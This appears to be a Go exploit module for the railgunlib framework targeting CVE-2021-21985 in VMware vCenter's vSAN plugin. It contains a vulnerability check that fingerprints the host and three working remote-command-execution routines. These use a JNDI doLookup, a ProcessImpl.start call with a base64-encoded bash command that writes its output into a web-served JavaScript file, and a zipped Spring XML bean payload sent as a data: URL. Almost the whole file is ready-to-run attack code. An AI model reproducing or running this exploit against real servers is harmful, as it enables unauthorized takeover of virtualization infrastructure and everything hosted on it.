package exp_vcenter

import (
	zip "archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
	"time"
)

type Exp_CVE_2021_21985 struct {
	exp_templates.ExpTemplate
}
type AutoGenerated struct {
	Result string `json:"result"`
}

func (self *Exp_CVE_2021_21985) Attack_cmd3() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/")

	methodoutput := `{"methodInput":[%s]}`
	headers.Set("Content-Type", "application/json")

	// 发送请求
	// 1
	httpresp := self.HttpPostWithoutRedirect(target+"setTargetObject", fmt.Sprintf(methodoutput, "null"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setTargetObject to null")

	// 2
	httpresp = self.HttpPostWithoutRedirect(target+"setStaticMethod", fmt.Sprintf(methodoutput, `"javax.naming.InitialContext.doLookup"`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setStaticMethod to payload")

	// 3
	httpresp = self.HttpPostWithoutRedirect(target+"setTargetMethod", fmt.Sprintf(methodoutput, `"doLookup"`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setTargetMethod to doLookup")

	// 4
	httpresp = self.HttpPostWithoutRedirect(target+"setArguments", fmt.Sprintf(methodoutput, `["`+cmd+`"]`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setArguments with payload args")

	// 5
	httpresp = self.HttpPostWithoutRedirect(target+"prepare", fmt.Sprintf(methodoutput, ""), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("initial payload class and methods")
	// 6
	httpresp = self.HttpPostWithoutRedirect(target+"invoke", fmt.Sprintf(methodoutput, ""), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("trigger method invoke")

	return

}

func (self *Exp_CVE_2021_21985) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty")

	methodoutput := `{"methodInput":[%s]}`
	headers.Set("Content-Type", "application/json")

	// 发送请求
	// 1
	httpresp := self.HttpPostWithoutRedirect(target, fmt.Sprintf(methodoutput, `"java.home",null`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `{"result":`) {
		expResult.Result = "漏洞存在"
	} else if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `{"error":`) {
		expResult.Result = "漏洞可能存在"
	} else if strings.Contains(httpresp.Body, `Unauthorized`) {
		expResult.Result = "漏洞已修复"
	} else if strings.Contains(httpresp.Body, `503 Service Unavailable`) {
		expResult.Result = "漏洞不存在"
	} else if strings.Contains(httpresp.Body, `The requested resource `) {
		expResult.Result = "漏洞不存在"
	}

	self.getProperty("os.name")
	self.getProperty("java.version")
	self.getProperty("user.name")
	self.getProperty("osgi.arch")
	self.getProperty("instance.dir")

	return
}
func (self *Exp_CVE_2021_21985) getProperty(key string) {
	headers := self.GetInitExpHeaders()
	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty")
	methodoutput := `{"methodInput":[%s]}`
	headers.Set("Content-Type", "application/json")

	httpresp := self.HttpPostWithoutRedirect(target, fmt.Sprintf(methodoutput, fmt.Sprintf(`"%s",null`, key)), headers)
	if httpresp.Err != nil {
		return
	}
	result := new(AutoGenerated)
	err := json.Unmarshal([]byte(httpresp.Body), &result)
	if err == nil {
		self.EchoSuccessMsg(key + ": " + result.Result)
	}

}

func (self *Exp_CVE_2021_21985) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/")

	methodoutput := `{"methodInput":[%s]}`
	headers.Set("Content-Type", "application/json")

	// 发送请求
	// 1
	httpresp := self.HttpPostWithoutRedirect(target+"setTargetObject", fmt.Sprintf(methodoutput, "null"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setTargetObject to null")

	// 2
	httpresp = self.HttpPostWithoutRedirect(target+"setStaticMethod", fmt.Sprintf(methodoutput, `"java.lang.ProcessImpl.start"`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setStaticMethod to payload")

	// 3
	httpresp = self.HttpPostWithoutRedirect(target+"setTargetMethod", fmt.Sprintf(methodoutput, `"start"`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setTargetMethod to doLookup")

	// 4
	payload := ""
	osVersion := self.MustGetStringParam("os")
	if osVersion == "linux" {
		payload = fmt.Sprintf("cd $(find /usr/lib/vmware-vsphere-ui/server/work/deployer -name jsUiLib.templates.js -type f -exec dirname {} \\;  | sed 1q) && echo `%s` > jsUiLib.templates.js.out.js", cmd)
		payload = fmt.Sprintf(methodoutput, fmt.Sprintf(`[["/bin/bash", "-c", "{echo,%s}|{base64,-d}|{bash,-i}"], null, ".", null, true]`, base64.StdEncoding.EncodeToString([]byte(payload))))

	} else {
		payload = fmt.Sprintf(methodoutput, fmt.Sprintf(`[["cmd.exe", "/c", "%s"], null, ".", null, true]`, cmd))
	}

	httpresp = self.HttpPostWithoutRedirect(target+"setArguments", payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("setArguments with payload args")

	// 5
	httpresp = self.HttpPostWithoutRedirect(target+"prepare", fmt.Sprintf(methodoutput, ""), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("initial payload class and methods")
	// 6
	httpresp = self.HttpPostWithoutRedirect(target+"invoke", fmt.Sprintf(methodoutput, ""), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("trigger method invoke")
	time.Sleep(time.Second)
	if osVersion == "linux" {
		headers.Del("Content-Type")
		httpresp = self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/ui/resources/js/jsUiLib.templates.js.out.js"), headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		self.EchoSuccessMsg("执行结果:\r\n" + httpresp.Body)
	}
	return

}

func (self *Exp_CVE_2021_21985) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	linuxXmlPayload := `<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ #{cmd}  2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\r\n&quot;))) }"/>
    </bean>
</beans>`
	winXmlPayload := `<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>cmd.exe</value>
            <value>/c</value>
            <value><![CDATA[ #{cmd} ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\r\n&quot;))) }"/>
    </bean>
</beans>`

	// 基于os执行不同xml
	xmlPayload := strings.ReplaceAll(linuxXmlPayload, "#{cmd}", cmd)
	if self.MustGetStringParam("os") == "windows" {
		xmlPayload = strings.ReplaceAll(winXmlPayload, "#{cmd}", cmd)
	}
	// zip压缩xml,文件名必须包含offline_bundle
	b := &bytes.Buffer{}
	zw := zip.NewWriter(b)

	iowriter, _ := zw.Create("test_offline_bundle.xml")
	iowriter.Write([]byte(xmlPayload))
	zw.Flush()
	zw.Close()

	// 构造最终payload
	payload := `["https://localhost:443/vsanHealth/vum/driverOfflineBundle/data%3atext/html%3bbase64%2c#{base64Str}"]`
	payload = strings.ReplaceAll(payload, "#{base64Str}", url.QueryEscape(base64.StdEncoding.EncodeToString(b.Bytes())))
	methodoutput := `{"methodInput":[%s]}`

	target := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/h5-vsan/rest/proxy/service/")
	headers.Set("Content-Type", "application/json")

	// 发送请求
	// 1
	httpresp := self.HttpPostWithoutRedirect(target+"vmodlContext/loadVmodlPackages", fmt.Sprintf(methodoutput, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("执行SpEL")

	// 2
	httpresp = self.HttpPostWithoutRedirect(target+"systemProperties/getProperty", fmt.Sprintf(methodoutput, `"output",null`), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	result := new(AutoGenerated)
	err := json.Unmarshal([]byte(httpresp.Body), &result)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	self.EchoSuccessMsg(strings.ReplaceAll(result.Result, "\\r\\n", "\r\n"))
	return

}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_21985{}, "exp_CVE_2021_21985.yml")

}
